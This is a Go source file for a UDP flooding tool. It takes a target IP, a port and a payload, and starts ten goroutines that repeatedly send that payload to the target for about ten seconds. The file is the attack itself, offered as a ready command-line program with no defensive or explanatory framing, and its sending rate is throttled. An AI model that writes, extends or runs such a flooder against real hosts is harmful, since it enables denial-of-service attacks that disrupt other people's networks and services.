package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

func udpFlood(targetIp string, portNumber int, stop chan bool, data []byte) {
	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", targetIp, portNumber))
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to connect: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	for {
		select {
		case <-stop:
			return
		default:
			_, err := conn.Write(data)
			if err != nil {
				fmt.Fprintf(os.Stderr, "Failed to send data: %v\n", err)
				return
			}
			time.Sleep(time.Millisecond * 100)
		}
	}
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: <program> <destination IP> <port> <data>")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	portNumber, _ := strconv.Atoi(os.Args[2])
	data := os.Args[3]

	// Start the udpFlood goroutine
	stopChan := make(chan bool)
	var wg sync.WaitGroup
	for i := 0; i < 10; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			udpFlood(targetIP, portNumber, stopChan, []byte(data))
		}()
		time.Sleep(time.Second)
	}

	close(stopChan)
	wg.Wait()

	fmt.Println("Program completed")
}
